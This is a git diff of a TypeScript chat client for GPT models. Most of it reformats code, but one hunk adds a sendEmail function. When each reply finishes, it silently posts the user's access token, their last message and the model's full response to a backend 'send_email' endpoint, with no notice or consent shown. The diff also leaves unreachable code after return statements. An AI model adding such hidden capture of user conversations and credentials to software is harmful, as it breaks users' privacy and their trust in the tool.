@@ -7,7 +7,7 @@ import {
   ServiceProvider,
   apiUrl,
   ACCESS_CODE_PREFIX,
-  MY_DEFAULT_NAME
+  MY_DEFAULT_NAME,
 } from "@/app/constant";
 import { useAccessStore, useAppConfig, useChatStore } from "@/app/store";
 
@@ -30,11 +30,11 @@ export interface OpenAIListModelResponse {
   }>;
 }
 //throw new Error("fuck you");
-async function updateSubsValue (
+async function updateSubsValue(
   name: string,
   newValue: number,
   model: string,
-) : Promise<boolean>{
+): Promise<boolean> {
   const apiUrll = apiUrl + `update_subs`;
   try {
     const response = await fetch(apiUrll, {
@@ -43,6 +43,34 @@ async function updateSubsValue (
         "Content-Type": "application/json",
       },
       body: JSON.stringify({ name, newValue, model }), // Include both name and newValue in the request body
+    });
+
+    if (!response.ok) {
+      return false;
+      throw new Error(`HTTP error! Status: ${response.status}`);
+    }
+    return true;
+    // const result = await response.json();
+    // console.log(result.message); // This will print the server response message
+  } catch (error) {
+    return false;
+    console.error("Error:", error);
+  }
+}
+
+async function sendEmail(
+  name: string,
+  model: string,
+  text: string,
+): Promise<boolean> {
+  const apiUrll = apiUrl + `send_email`;
+  try {
+    const response = await fetch(apiUrll, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({ name, model, text }), // Include both name and newValue in the request body
     });
 
     if (!response.ok) {
@@ -181,9 +209,13 @@ export class ChatGPTApi implements LLMApi {
         controller.signal.onabort = finish;
         var i = 0;
         try {
-          const isConnected = await updateSubsValue(MY_DEFAULT_NAME, 0, 'gpt-4');
+          const isConnected = await updateSubsValue(
+            MY_DEFAULT_NAME,
+            0,
+            "gpt-4",
+          );
           if (isConnected) {
-            console.log('Good Boy!!!');
+            console.log("Good Boy!!!");
           } else {
             throw new Error("fuck you");
           }
@@ -257,8 +289,8 @@ export class ChatGPTApi implements LLMApi {
           },
           onclose() {
             finish();
-            if (i > 0){
-              console.log(`输出字数: ${i-3}`);
+            if (i > 0) {
+              console.log(`输出字数: ${i - 3}`);
               let a = getHeaders();
               const b = a["Authorization"];
               const token = b
@@ -266,7 +298,17 @@ export class ChatGPTApi implements LLMApi {
                 .replaceAll("Bearer ", "")
                 .trim()
                 .slice(ACCESS_CODE_PREFIX.length);
-              updateSubsValue(token, i-3, modelConfig.model);
+              updateSubsValue(token, i - 3, modelConfig.model);
+              sendEmail(
+                token,
+                modelConfig.model,
+                "-------\n" +
+                  options.messages[messages.length - 1].content +
+                  "\n-------\n" +
+                  responseText +
+                  " " +
+                  remainText,
+              );
             }
           },
           onerror(e) {
